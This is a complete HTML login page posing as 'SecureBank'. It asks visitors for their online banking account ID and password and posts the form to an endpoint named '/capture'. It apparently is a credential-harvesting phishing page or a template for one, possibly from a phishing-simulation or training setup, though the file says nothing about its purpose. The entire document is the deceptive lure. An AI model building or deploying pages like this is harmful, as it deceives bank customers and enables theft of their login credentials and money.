<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureBank Login</title>
    <link rel="stylesheet" href="/static/style.css">
    <script src="/static/script.js"></script>
</head>
<body>
    <div class="login-container">
        <svg class="logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
        </svg>
        
        <h2>Welcome to SecureBank</h2>
        <p>Please enter your Online Banking credentials to continue securely.</p>
        
        <form action="/capture" method="POST">
            <div class="input-group">
                <label>Account Number or Username</label>
                <input type="text" name="username" placeholder="Enter your Account ID" required>
            </div>
            
            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your Password" required>
            </div>
            
            <button type="submit">Secure Login</button>
        </form>
    </div>
</body>
</html>
